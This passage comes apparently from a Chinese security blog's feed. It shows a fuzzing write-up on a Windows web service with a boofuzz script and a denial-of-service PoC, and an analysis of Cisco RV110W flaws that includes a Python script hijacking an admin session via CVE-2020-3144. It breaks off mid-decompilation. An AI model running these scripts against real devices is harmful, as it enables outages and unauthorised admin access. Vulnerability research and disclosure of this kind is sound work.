class="comment"># LINE 1</span></span><br><span class="line">        s_static(<span class="string">&quot;POST&quot;</span>, name=<span class="string">&quot;Method&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot; &quot;</span>, name=<span class="string">&#x27;space-1&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;/aaaa&#x27;</span>, name=<span class="string">&#x27;URI&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot; &quot;</span>, name=<span class="string">&#x27;space-2&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;HTTP/1.1&#x27;</span>, name=<span class="string">&#x27;HTTP-Version&#x27;</span>)   </span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 2</span></span><br><span class="line">        s_static(<span class="string">&quot;Host&quot;</span>, name=<span class="string">&quot;Host&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;192.168.1.1&quot;</span>, name=<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LINE 3</span></span><br><span class="line">        <span class="comment"># cookie pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 4</span></span><br><span class="line">        s_static(<span class="string">&#x27;Origin&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, name=<span class="string">&#x27;orogin&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 5</span></span><br><span class="line">        s_static(<span class="string">&#x27;Content-Type&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>, name=<span class="string">&#x27;content-type&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 6</span></span><br><span class="line">        s_static(<span class="string">&#x27;User-Agent&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36&#x27;</span>, name=<span class="string">&#x27;user-agent&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 7</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>, name=<span class="string">&#x27;accept&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 8</span></span><br><span class="line">        s_static(<span class="string">&#x27;Referer&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;http://192.168.1.1/weblogin.htm&#x27;</span>, name=<span class="string">&#x27;referer&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 9</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept-Encoding&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;gzip, deflate&#x27;</span>, name=<span class="string">&#x27;accept-encoding&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 10</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept-Language&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>, name=<span class="string">&#x27;accept-language&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 11</span></span><br><span class="line">        s_static(<span class="string">&#x27;Connection&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;close&#x27;</span>, name=<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        s_static(<span class="string">&#x27;aa=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;aa&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;&amp;ab=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;ab&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;&amp;ac=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;ac&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    session.connect(s_get(<span class="string">&quot;Request&quot;</span>))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line">fuck()</span><br></pre></td></tr></table></figure></div>

<p>boofuzz 允许设置监视器，可以在每次 fuzz 之后检查程序是否运行正常，由于目标程序比较简单，没有编写监视器，手动来检测也可以。</p>
<p>运行之后 Web 服务立刻就会崩溃，信息如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-2.png"
                     
                ></p>
<p>错误代码 c0000409 属于内存访问错误，这里可以确定程序中确实存在一些内存越界问题。</p>
<p>经过测试发现能够稳定触发漏洞的 POC 如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-3.png"
                     
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /&lt;payload&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.136.130</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>

<p>在 payload 处插入超长的字符串可以导致程序崩溃。</p>
<p>接下来要判断崩溃的原因，经尝试 OD 不能正确的捕获到异常信息，需要使用 IDA 调试。</p>
<p>IDA 运行程序之后发送 payload，提示异常信息如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-4.png"
                     
                ></p>
<p>程序访问了非法地址 0x00190000，中断位置：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-5.png"
                     
                ></p>
<p>edx 就是非法地址。由于中断位于 kernel32.dll 中，猜测是某个系统 API 函数，想要定位用户程序中哪里调用了此函数，可以进行栈回溯，首先找到 EBP 的值为 0018EDE0，查看返回地址 0018EDE4 内容为 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0018EDE4  0040297E  sub_4028A0:loc_40297E</span><br></pre></td></tr></table></figure></div>

<p>这样就找到了 Web 服务器中可能存在问题的代码段，在 IDA 中转到地址 0040297E，发现这里的代码没有被正常识别为函数，在地址 004028A0 按 P 键创建函数，F5 就可以看到反编译代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR *v4; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">12</span>) &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(a1 + <span class="number">44</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( *(a1 + <span class="number">20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">16</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(v3 + <span class="number">32</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = CTime::Format(v3 + <span class="number">20</span>, &amp;a1, <span class="number">57347</span>);</span><br><span class="line">          lstrcpyA(*(v2 + <span class="number">32</span>), *v4);</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">          CString::~CString(&amp;a1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(v3 + <span class="number">32</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = CTime::Format(v3 + <span class="number">20</span>, &amp;v6, <span class="number">57347</span>);</span><br><span class="line">          lstrcpyA(*(v2 + <span class="number">32</span>), *v5);</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">          CString::~CString(&amp;v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">12</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>显然其中引用了多次 lstrcpyA 函数进行字符串拷贝，在拷贝的时候不考虑源字符串长度，当传入超长的字符串之后将导致溢出。不过在静态分析下无法定位到谁使用了这个函数，所以可通过调试看看执行到这里时内存布局情况。</p>
<p>IDA 启动调试，在此函数下断点，当执行到崩溃位置时 lstrcpyA 函数参数如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-6.png"
                     
                ></p>
<p>源字符串就是我们传入的 payload，目的内存位于栈中，地址是 0018F3C0，进入拷贝函数之后由于源字符串超长，缓冲区指针将不断递增，最终到达 0x00190000 的不可写内存，导致程序崩溃。</p>
<p>值得注意的是当提示程序停止工作的时候，错误模块是 comctl32.dll，它是应用程序共用 GUI 库，当发送一个访问请求之后，程序会在窗口中将访问的 URI 显示出来，在显示的过程中缺少对 URI 长度限制，可能导致在绘制 GUI 的时候发生错误。</p>
<p>POC</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.136.130&quot;</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x1000</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(burp0_url, headers=burp0_headers, timeout=<span class="number">3</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Success!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id=""><a href="#" class="headerlink" title="-"></a>-</h2><p>这个漏洞比较简单，目前来看只能造成拒绝服务，暂时不清楚能否对控制系统产生影响，另外在主程序存在数据传输端口 1998，有可能也存在一些问题。</p>
<p>我们使用了简单的 fuzz 技巧来发现这个漏洞，fuzz 的核心就是定义数据格式适配目标程序，如果大家有更好的模糊测试思路欢迎来信讨论。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Cisco RV110W 数个漏洞</title>
    <url>/2020/11/10/cisco-rv110w-bugs/</url>
    <content><![CDATA[<p><strong>该系列设备已经进入 EOL (End Of Life) 阶段，官方不会针对漏洞发布安全更新。</strong></p>
<p><strong>建议用户及时下线并替换该系列设备。</strong></p>
<span id="more"></span>

<h2 id="CVE-2020-3144"><a href="#CVE-2020-3144" class="headerlink" title="CVE-2020-3144"></a>CVE-2020-3144</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>Cisco 官方发布信息： <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-auth-bypass-cGv9EruZ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>漏洞评分：9.8(<strong>Critical</strong>)</p>
<p>漏洞描述：此漏洞位于 web 管理界面中，影响 Cisco RV110W，RV130 以及 RV215W 等设备。由于对 session 的管理存在问题，攻击者可以构造特殊格式的 HTTP 请求触发漏洞，成功的攻击可以使攻击者获取设备的管理员权限。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此漏洞在 1.2.2.8 版本中进行了修复。</p>
<p>固件下载链接(请下载 1.2.2.8 以下版本)：<a class="link"   href="https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899" >https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8?catid=268437899<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>binwalk 可以顺利的解压固件，得到一个标准的嵌入式 Linux 文件系统。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-1.png"
                     
                ></p>
<p>漏洞在处理 http 请求的文件中，文件路径：&#x2F;usr&#x2F;sbin&#x2F;httpd。它是一个 MIPS32 小端序的二进制文件，直接使用 Ghidra 打开。</p>
<p>关键函数位于 log_in_cgi 中，此函数主要实现用户登录的逻辑，函数代码稍长，关键部分如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">enc = <span class="built_in">strcmp</span>(__s1_00,<span class="string">&quot;continue&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (enc == <span class="number">0</span>) &#123;</span><br><span class="line">  nvram_unset(<span class="string">&quot;tmp_auth_key&quot;</span>);</span><br><span class="line">  user = (undefined *)nvram_get(<span class="string">&quot;session_key&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (user == (undefined *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    user = &amp;DAT_00487eb0;</span><br><span class="line">  &#125;</span><br><span class="line">  set_key_status(user,<span class="string">&quot;drop&quot;</span>);</span><br><span class="line">  set_login_info(param_1,local_30);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>__s1_00 变量由 get_cgi 函数返回</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">method = (char *)get_cgi(&quot;submit_type&quot;);</span><br></pre></td></tr></table></figure></div>

<p>经过抓包发现 get_cgi 函数用于获取用户发送请求中的字段，submit_type 是用户提交请求的类型，登录的时候主要有两种类型，一是 set_lang，用于设置语言，二是 continue，这是我们需要关注的请求。</p>
<p>那么 continue 是什么功能呢？如果有设备的话就很好验证了，打开 web 管理界面如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-2.png"
                     
                ></p>
<p>此时可以正常登录管理员账户(默认用户名密码为 cisco:cisco)，成功登录后如果没有主动登出，只是简单的关闭了网页，后台的管理员账户是不会自动登出的，此时再发起一个新的登录请求，会看到如下界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/rv110w-3.png"
                     
                ></p>
<p>开启抓包，点击 continue，得到请求如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://192.168.1.1/login.cgi</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">submit_button=login&amp;submit_type=continue&amp;gui_action=gozila_cgi&amp;next_page=&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=&amp;pwd=&amp;sel_lang=EN</span><br></pre></td></tr></table></figure></div>

<p>此时 submit_type 就是 continue，根据代码来看，当用户发送了 continue 请求的时候，并且当前 nvram 中的 session_key 字段不为空，就直接设置登录信息，不验证用户名和密码，并且这个请求不需要身份验证。</p>
<p>所以如果我们能在真正的管理员发起登录请求和 continue 请求之间发送 continue 请求，就可以截获管理员的 session_id，从而获取后台管理权限。</p>
<p>此漏洞的 POC 如下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Code from https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_type&quot;</span>:<span class="string">&quot;continue&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gui_action&quot;</span>:<span class="string">&quot;gozila_cgi&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">&quot;https://192.168.1.1/login.cgi&quot;</span>,</span><br><span class="line">            data=payload,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Login Page&quot;</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sessionid = re.findall(<span class="string">r&quot;session_id=([^\&quot;]+)&quot;</span>, resp.content)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully hijacked admin session. Session id is</span></span><br><span class="line"><span class="string">            &#123;&#125;&quot;</span>.<span class="built_in">format</span>(sessionid))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><strong>注：session_id 和登录者的 IP 具有对应关系，例如管理员从 ip 为 192.168.1.100 的机器上登录了路由器后台，攻击者从 ip 为 192.168.1.101 的机器上进行 session_id 劫持得到 session_id，但由于 ip 的绑定关系，他并不能直接从本机登录。</strong></p>
<h2 id="CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx"><a href="#CVE-2020-3145-amp-CVE-2020-3146-amp-CVE-xxxx-xxxx" class="headerlink" title="CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx"></a>CVE-2020-3145 &amp; CVE-2020-3146 &amp; CVE-xxxx-xxxx</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><p>CVE-2020-3145 &amp; CVE-2020-3146 两个漏洞官方信息： <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>由于这些漏洞都位于后台，实际利用价值不大，所以我们以一个为例分析。</p>
<p>3145 和 3146 两个漏洞的分析可以在<a class="link"   href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找到(感谢作者)，我们要分析的是一个此前没有被披露的漏洞，并且在最新版中也存在(1.2.2.8)。</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这些后台漏洞成因基本相同，都是对用户提交的数据验证不严格导致的。我们分析的漏洞位于函数 save_http_user (1.2.2.8)，Ghidra 可以直接进行反编译，结果如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">save_http_user</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined4 uVar3;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  undefined4 *__s1;</span><br><span class="line">  undefined4 *__s1_00;</span><br><span class="line">  undefined1 *puVar4;</span><br><span class="line">  <span class="type">int</span> iVar5;</span><br><span class="line">  undefined local_c8;</span><br><span class="line">  undefined auStack199 [<span class="number">49</span>];</span><br><span class="line">  undefined auStack150 [<span class="number">50</span>];</span><br><span class="line">  undefined auStack100 [<span class="number">52</span>];</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  </span><br><span class="line">  __s1_00 = (undefined4 *)get_cgi(<span class="string">&quot;enadmin&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1_00 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1_00 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = (undefined4 *)get_cgi(<span class="string">&quot;enguest&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (undefined4 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = &amp;DAT_0047c3f8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;local_c8,<span class="number">0</span>,<span class="number">0x96</span>);</span><br><span class="line">  local_c8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack199,<span class="number">0</span>,<span class="number">0x31</span>);</span><br><span class="line">  puVar4 = (undefined1 *)get_cgi(<span class="string">&quot;en_guest&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (puVar4 == (undefined1 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    puVar4 = &amp;DAT_00486160;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1_00,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">  iVar5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    local_2c = get_cgi(<span class="string">&quot;admin_name&quot;</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">&quot;admin_old_pwd&quot;</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">&quot;admin_new_pwd&quot;</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_user0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">&quot;%[^,],%[^,],%[^\n]&quot;</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar5 = setpwd(<span class="number">0</span>,local_2c,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    guest_name = get_cgi(<span class="string">&quot;guest_name&quot;</span>);</span><br><span class="line">    uVar2 = get_cgi(<span class="string">&quot;guest_old_pwd&quot;</span>);</span><br><span class="line">    uVar3 = get_cgi(<span class="string">&quot;guest_new_pwd&quot;</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_user1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      __s = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sscanf</span>(__s,<span class="string">&quot;%[^,],%[^,],%[^\n]&quot;</span>,&amp;local_c8,auStack150,auStack100);</span><br><span class="line">    iVar1 = setpwd(<span class="number">1</span>,guest_name,auStack150,uVar2,uVar3,&amp;local_c8);</span><br><span class="line">    iVar5 = iVar5 + iVar1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar5 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)__s1_00,<span class="string">&quot;on&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) 